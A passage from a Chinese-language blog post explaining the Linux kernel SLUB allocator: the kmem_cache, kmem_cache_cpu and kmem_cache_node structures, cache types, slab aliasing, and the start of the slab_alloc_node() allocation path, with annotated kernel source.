class="hljs-title">KMALLOC_SHIFT_HIGH</span> + 1] __<span class="hljs-title">ro_after_init</span> =</span><br>&#123; <span class="hljs-comment">/* initialization for https://bugs.llvm.org/show_bug.cgi?id=42570 */</span> &#125;;<br>EXPORT_SYMBOL(kmalloc_caches);<br></code></pre></td></tr></table></figure><blockquote><p>老版本还有个 dma 专用数组 <code>kmalloc_dma_caches</code> ，在 <a href="https://patchwork.kernel.org/project/linux-mm/patch/20180718133620.6205-2-vbabka@suse.cz/">这个 commit</a> 给合并起来了</p></blockquote><h3 id="I-基本结构"><a href="#I-基本结构" class="headerlink" title="I. 基本结构"></a>I. 基本结构</h3><p>该结构体定义于 <code>include/linux/slub_def.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Slab 缓存管理.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_SLUB_TINY</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> __<span class="hljs-title">percpu</span> *<span class="hljs-title">cpu_slab</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">/* 用于取回 partial slabs 等. */</span><br><span class="hljs-type">slab_flags_t</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> min_partial;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size;<span class="hljs-comment">/* 一个对象包含元数据的大小 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> object_size;<span class="hljs-comment">/* 一个对象不包含元数据的大小 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">reciprocal_value</span> <span class="hljs-title">reciprocal_size</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset;<span class="hljs-comment">/* 空闲指针的偏移 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span><br><span class="hljs-comment">/* 要保留的 per cpu partial 对象数量 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cpu_partial;<br><span class="hljs-comment">/* 要保留的 per cpu partial slub 数量 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cpu_partial_slabs;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_order_objects</span> <span class="hljs-title">oo</span>;</span><br><br><span class="hljs-comment">/* 分配与释放 slabs */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_order_objects</span> <span class="hljs-title">min</span>;</span><br><span class="hljs-type">gfp_t</span> allocflags;<span class="hljs-comment">/* （译注：向 buddy system）分配时所用的 gfp 标志位 */</span><br><span class="hljs-type">int</span> refcount;<span class="hljs-comment">/* 用于 slab 缓存销毁的引用计数 */</span><br><span class="hljs-type">void</span> (*ctor)(<span class="hljs-type">void</span> *);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> inuse;<span class="hljs-comment">/* 元数据的偏移 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> align;<span class="hljs-comment">/* 对齐 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> red_left_pad;<span class="hljs-comment">/* Left redzone padding size */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<span class="hljs-comment">/* Name (only for display!) */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><span class="hljs-comment">/* slab 缓存链表 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SYSFS</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kobject</span> <span class="hljs-title">kobj</span>;</span><span class="hljs-comment">/* For sysfs */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> random;<span class="hljs-comment">// 用于加密 freelist 指针的随机值</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NUMA</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 通过从一个 remote node 分配以去碎片化.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> remote_node_defrag_ratio;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *random_seq;<span class="hljs-comment">// 用于在初始化时随机化 freelist</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_KASAN</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kasan_cache</span> <span class="hljs-title">kasan_info</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_HARDENED_USERCOPY</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> useroffset;<span class="hljs-comment">/* 用户拷贝区域的偏移 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> usersize;<span class="hljs-comment">/* 用户拷贝区域的大小 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">node</span>[<span class="hljs-title">MAX_NUMNODES</span>];</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><p><code>cpu_slab</code>： <em>percpu 变量</em> ，指向一个 <code>kmem_cache_cpu</code> 结构体，即<strong>当前 CPU 独占的内存池</strong></p></li><li><p><code>flags</code>：标志位</p></li><li><p><code>min_partial</code>：node partial 链表上 slab 的<strong>最大数量</strong>（👴也不知道为什么要叫min，但实际判定发挥的是max的作用）</p></li><li><p><code>cpu_partial_slabs</code>：cpu partial 链表上  slab 的<strong>最大数量</strong></p></li><li><p><code>cpu_partial</code>：per cpu partial list 中最多的对象数量（但好象是没啥用）</p></li><li><p><code>size</code>：一个对象的实际大小</p></li><li><p><code>object_size</code>：一个对象所用数据的大小</p><blockquote><p>例如 <code>struct cred</code> 大小为 176（object_size），实际分配的对象大小为 192 （size）</p></blockquote></li><li><p><code>offset</code>：slab 上空闲对象链表指针在对象上的偏移</p></li><li><p><code>oo</code> ： <em>其实就是一个 int</em> </p><ul><li>低 16 位：一张 slab 上的对象数量</li><li>高 16 位：一张 slab 的大小（2<sup>n</sup> 张内存页）</li></ul></li><li><p><code>min</code>：一张 slab 上最少的对象数量</p></li><li><p><code>allocflags</code>：向 buddy system 请求页面时所用的 gfp flag</p></li><li><p><code>ctor</code>：对象的构造函数，在分配对象后会调用该函数进行初始化</p></li><li><p><code>inuse</code>：实际上就是 <code>object_size</code></p></li><li><p><code>align</code>：对象对齐的宽度</p></li><li><p>Randomed freelist 保护相关：</p><ul><li><code>random_seq</code> ：用于在 slab 初始化时随机化 freelist 上空闲对象的连接顺序</li></ul></li><li><p>Hardened Usercopy 保护相关</p><ul><li><code>useroffset</code>：用户空间能读写区域的起始偏移</li><li><code>usersize</code>：用户空间能读写区域的大小</li></ul></li><li><p><code>node</code>：一个 <code>kmem_cache_node</code> 数组，对应多个<strong>不同 node 的后备内存池</strong></p></li></ul><p><img src="https://s2.loli.net/2023/02/21/D4idvgzLAaqIBQM.png" alt="image.png"></p><h3 id="II-类型"><a href="#II-类型" class="headerlink" title="II. 类型"></a>II. 类型</h3><p>初始时一共有如下几种类型的 <code>kmem_cache</code>，在进行内存分配时若未指定内存池则会根据对应的 flag 从不同的 <code>kmem_cache</code> 中取：</p><ul><li><code>KMALLOC_NORMAL</code> ：通用类型内存池，对应 <code>kmalloc-*</code>，对应分配 flag 为 <code>GFP_KERNEL</code></li><li><code>KMALLOC_DMA</code>：用于 DMA 的内存池，对应 <code>kmalloc-dma-*</code></li><li><code>KMALLOC_RECLAIM</code> 可以被回收的内存池，对应 <code>kmalloc-rcl-*</code></li><li><code>KMALLOC_CGROUP</code> ：用于需要进行数量统计（<code>accounted</code>，主要用于 CGROUP 相关）的内存池，对应 <code>kmalloc-cg-*</code> ，对应分配 flag 为 <code>GFP_KERNEL_ACCOUNT</code></li></ul><p>若是未开启对应的编译选项，则默认合并入 <code>KMALLOC_NORMAL</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Whenever changing this, take care of that kmalloc_type() and</span><br><span class="hljs-comment"> * create_kmalloc_caches() still work as intended.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * KMALLOC_NORMAL can contain only unaccounted objects whereas KMALLOC_CGROUP</span><br><span class="hljs-comment"> * is for accounted but unreclaimable and non-dma objects. All the other</span><br><span class="hljs-comment"> * kmem caches can have both accounted and unaccounted objects.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">kmalloc_cache_type</span> &#123;</span><br>KMALLOC_NORMAL = <span class="hljs-number">0</span>,<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_ZONE_DMA</span><br>KMALLOC_DMA = KMALLOC_NORMAL,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_MEMCG_KMEM</span><br>KMALLOC_CGROUP = KMALLOC_NORMAL,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_TINY</span><br>KMALLOC_RECLAIM = KMALLOC_NORMAL,<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>KMALLOC_RECLAIM,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ZONE_DMA</span><br>KMALLOC_DMA,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMCG_KMEM</span><br>KMALLOC_CGROUP,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>NR_KMALLOC_TYPES<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="III-slab-alias（mergeability）"><a href="#III-slab-alias（mergeability）" class="headerlink" title="III. slab alias（mergeability）"></a>III. slab alias（mergeability）</h3><p>slab alias 机制是一种对同等&#x2F;相近大小 object 的 <code>kmem_cache</code> 进行<strong>复用</strong>的一种机制：</p><ul><li>当一个 <code>kmem_cache</code> 在创建时，若已经存在能分配相等&#x2F;近似大小的 object 的 <code>kmem_cache</code> ，则<strong>不会创建新的 kmem_cache，而是为原有的 kmem_cache 起一个 alias，作为“新的” kmem_cache 返回</strong></li></ul><blockquote><p>举个🌰，<code>cred_jar</code> 是专门用以分配 <code>cred</code> 结构体的 <code>kmem_cache</code>，在 Linux 4.4 之前的版本中，其为 <code>kmalloc-192</code> 的 alias，即 cred 结构体与其他的 192 大小的 object 都会从同一个 <code>kmem_cache</code>——<code>kmalloc-192</code> 中分配</p></blockquote><p>对于初始化时设置了 <code>SLAB_ACCOUNT</code> 这一 flag 的 <code>kmem_cache</code> 而言，则会新建一个新的 <code>kmem_cache</code> 而非为原有的建立 alias，🌰如在新版的内核当中 <code>cred_jar</code> 与 <code>kmalloc-192</code> 便是两个独立的 <code>kmem_cache</code>，<strong>彼此之间互不干扰</strong></p><h2 id="三、kmem-cache-cpu：各-CPU-独占内存池"><a href="#三、kmem-cache-cpu：各-CPU-独占内存池" class="headerlink" title="三、kmem_cache_cpu：各 CPU 独占内存池"></a>三、kmem_cache_cpu：各 CPU 独占内存池</h2><p>当进程向 slab allocator 请求内存分配时，首先会尝试从当前 CPU 的独占内存池进行分配 ——<code>kmem_cache_cpu</code> 结构体表示<strong>每个 CPU 独占的内存池</strong>，其在 <code>kmem_cache</code> 中为一个 percpu 变量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * When changing the layout, make sure freelist and tid are still compatible</span><br><span class="hljs-comment"> * with this_cpu_cmpxchg_double() alignment requirements.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> &#123;</span><br><span class="hljs-type">void</span> **freelist;<span class="hljs-comment">/* 指向下一个可用对象的指针 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> tid;<span class="hljs-comment">/* Globally unique transaction id */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><span class="hljs-comment">/* 用以内存分配的 slab */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">partial</span>;</span><span class="hljs-comment">/* Partially allocated frozen slabs */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">local_lock_t</span> lock;<span class="hljs-comment">/* Protects the fields above */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_STATS</span><br><span class="hljs-type">unsigned</span> stat[NR_SLUB_STAT_ITEMS];<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>freelist</code>：指向下一个空闲对象的指针</li><li><code>slab</code>：当前用以进行内存分配的 slab</li><li><code>partial</code>：percpu partial slab 链表，链表上为仍有一定空闲对象的 slab</li></ul><p>slab 的 freelist 仅当其在 partial 链表上时有用，当一张 slab 为当前 CPU 正在使用的 slab 时，其 freelist 为 NULL，由 <code>kmem_cache_cpu.freelist</code> 指向第一个空闲对象</p><p><img src="https://s2.loli.net/2023/02/21/xSLqghNZ23nCMiz.png" alt="image.png"></p><h2 id="四、kmem-cache-node：各-node-后备内存池"><a href="#四、kmem-cache-node：各-node-后备内存池" class="headerlink" title="四、kmem_cache_node：各 node 后备内存池"></a>四、kmem_cache_node：各 node 后备内存池</h2><p><strong>每个 <a href="https://arttnba3.cn/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/#0x03-struct-pglist-data%EF%BC%9A%E8%8A%82%E7%82%B9">node</a> 对应的后备内存池</strong>，当 percpu 的独占内存池耗尽后便会从对应 node 的后备内存池尝试分配</p><blockquote><p>不过大部分计算机都仅有一个 node，所以通常情况下每个 <code>kmem_cache</code> 也就只有一个 <code>kmem_cache_node</code>  😄</p></blockquote><p>因为本文主要讲 slub，所以仅截取 slub 相关字段：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_SLOB</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The slab lists for all objects.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB</span><br><span class="hljs-comment">//...</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB</span><br><span class="hljs-type">spinlock_t</span> list_lock;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_partial;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">partial</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_DEBUG</span><br><span class="hljs-type">atomic_long_t</span> nr_slabs;<br><span class="hljs-type">atomic_long_t</span> total_objects;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">full</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>list_lock</code>：保护 partial 和 full 链表的锁</li><li><code>partial</code>：partial slab 链表，连接<strong>有着部分空闲对象剩余的 slab</strong></li><li><code>nr_partial</code>：partial slab 的数量</li><li><code>full</code>：full slab 链表，连接<strong>空闲对象完全耗尽的 slab</strong>（注：该链表基本上不常用）</li><li><code>nr_slabs</code>：总的 slab 数量</li><li><code>total_objects</code>：总的对象数量</li></ul><p><img src="https://s2.loli.net/2023/02/21/ECDOVtxAyiwd1UZ.png" alt="image.png"></p><h1 id="0x02-对象的分配"><a href="#0x02-对象的分配" class="headerlink" title="0x02. 对象的分配"></a>0x02. 对象的分配</h1><h2 id="※-一、slab-alloc-node-：从指定的-kmem-cache-分配-object"><a href="#※-一、slab-alloc-node-：从指定的-kmem-cache-分配-object" class="headerlink" title="※ 一、slab_alloc_node()：从指定的 kmem_cache 分配 object"></a>※ 一、slab_alloc_node()：从指定的 kmem_cache 分配 object</h2><p>在 slab allocator 中存在着多个不同的内存分配接口，其最后都会调用到 <code>slab_alloc_node()</code> 完成内存分配的工作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 内联化的快速路径以让分配函数 (kmalloc, kmem_cache_alloc) 中包含快速路径.</span><br><span class="hljs-comment"> * 因此，对于快速路径可以满足的请求，没有函数调用的开销.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 快速路径首先检查无锁的空闲链表是否可以被使用.</span><br><span class="hljs-comment"> * 若否，调用 __slab_alloc 进行缓慢处理.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 否则我们可以简单地从无锁空闲链表取出下一个对象.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __fastpath_inline <span class="hljs-type">void</span> *<span class="hljs-title function_">slab_alloc_node</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> list_lru *lru,</span><br><span class="hljs-params"><span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">size_t</span> orig_size)</span><br>&#123;<br><span class="hljs-type">void</span> *object;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">obj_cgroup</span> *<span class="hljs-title">objcg</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">bool</span> init = <span class="hljs-literal">false</span>;<br></code></pre></td></tr></table></figure><p>该函数首先会调用 <code>slab_pre_alloc_hook()</code> 进行分配前的检查工作，不通过则返回 NULL，这一步主要是检查分配标志位是否合法等：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">s = slab_pre_alloc_hook(s, lru, &amp;objcg, <span class="hljs-number">1</span>, gfpflags);<br><span class="hljs-keyword">if</span> (!s)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure><p>接下来调用 <code>kfence_alloc()</code> 进行内存错误检测，不通过则直接跳转到 <code>out</code>，这里用到了 <em>Kfence (Kernel Electric Fence)</em>  内存纠错机制，主要是检查对 <code>data page</code> 的访问是否越界：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">object = kfence_alloc(s, orig_size, gfpflags);<br><span class="hljs-keyword">if</span> (unlikely(object))<br><span class="hljs-keyword">goto</span> out;<br></code></pre></td></tr></table></figure><p><strong>接下来调用 <code>__slab_alloc_node()</code> 进行正式的内存分配，这一步便是真正的核心分配函数</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">object = __slab_alloc_node(s, gfpflags, node, addr, orig_size);<br></code></pre></td></tr></table></figure><p>最后调用 <code>maybe_wipe_obj_freeptr()</code> 将 object 原本存放 next free object 指针的位置清零，之后调用 <code>slab_want_init_on_alloc()</code> 检查标志位是否有 <code>__GFP_ZERO</code>，若有则调用 <code>slab_post_alloc_hook()</code> 将 object 上数据清零</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">maybe_wipe_obj_freeptr(s, object);<br>init = slab_want_init_on_alloc(gfpflags, s);<br><br>out:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 当 init == &#x27;true&#x27;, 类似 kzalloc() 族, </span><br><span class="hljs-comment"> * 仅有 @orig_size 字节会被清零，而非 s-&gt;object_size</span><br><span class="hljs-comment"> */</span><br>slab_post_alloc_hook(s, objcg, gfpflags, <span class="hljs-number">1</span>, &amp;object, init, orig_size);<br><br><span class="hljs-keyword">return</span> object;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来我们来看真正的核心分配函数 <code>__slab_alloc_node()</code></p><h3 id="I-slab-alloc-node-：从-percpu-freelist-进行分配（fast-path）"><a href="#I-slab-alloc-node-：从-percpu-freelist-进行分配（fast-path）" class="headerlink" title="I. __slab_alloc_node()：从 percpu freelist 进行分配（fast path）"></a>I. __slab_alloc_node()：从 percpu freelist 进行分配（fast path）</h3><p>该函数首先会先获取 percpu 的 <code>kmem_cache_cpu</code> 上的 freelist 与 slab，<strong>若 slab 或 freelist 为空</strong> &#x2F; slab 与 node 不匹配，则调用 <code>__slab_alloc()</code> 分配一张新 slab 并从其中获取一个空闲对象：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> *__slab_alloc_node(<span class="hljs-keyword">struct</span> kmem_cache *s,<br><span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">size_t</span> orig_size)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> *<span class="hljs-title">c</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> tid;<br><span class="hljs-type">void</span> *object;<br><br>redo:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 必须通过该 cpu ptr 读取 kmem_cache cpu 数据. 抢占是开启的.</span><br><span class="hljs-comment"> * 我们可能会在从一个 cpu 区域读取时在 cpu 间切换.</span><br><span class="hljs-comment"> * 只要我们在 cmpxchg 时在原本的 cpu 上重新结束便不要紧.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 我们必须保证 tid 与 kmem_cache_cpu 被在同一 cpu 上取回.</span><br><span class="hljs-comment"> * 我们首先读取 kmem_cache_cpu 指针并用其读取 tid.</span><br><span class="hljs-comment"> * 若我们在两次读取间被抢占并切换到另一 cpu，由于这两者仍与同一 cpu 关联，</span><br><span class="hljs-comment"> * cmpxchg 稍后将会验证 cpu ，这是 OK 的.</span><br><span class="hljs-comment"> */</span><br>c = raw_cpu_ptr(s-&gt;cpu_slab);<br>tid = READ_ONCE(c-&gt;tid);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 此处使用的无中断（irqless） 对象分配/释放算法决定于获取 cpu_slab 数据的顺序.</span><br><span class="hljs-comment"> * tid 应当在在 c 上的任何事之前被获取以确保与此前 tid 关联的对象与 slab</span><br><span class="hljs-comment"> * 不会被与当前 tid 一起使用. 若我们先获取 tid，对象与 slab 可能会与下一个 tid </span><br><span class="hljs-comment"> * 相关联，而我们的分配/释放请求也将会失败.这种情况下我们会重试所以没问题.</span><br><span class="hljs-comment"> */</span><br>barrier();<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The transaction ids are globally unique per cpu and per operation on</span><br><span class="hljs-comment"> * a per cpu queue（这句翻成中文咋都不顺，直接看原文吧😄）.</span><br><span class="hljs-comment"> * 由此可以确保 cmpxchg_double 发生在正确的处理器上且其间在链表上没有任何操作.</span><br><span class="hljs-comment"> */</span><br><br>object = c-&gt;freelist;<br>slab = c-&gt;slab;<br><br><span class="hljs-keyword">if</span> (!USE_LOCKLESS_FAST_PATH() ||<br>    unlikely(!object || !slab || !node_match(slab, node))) &#123;<br>object = 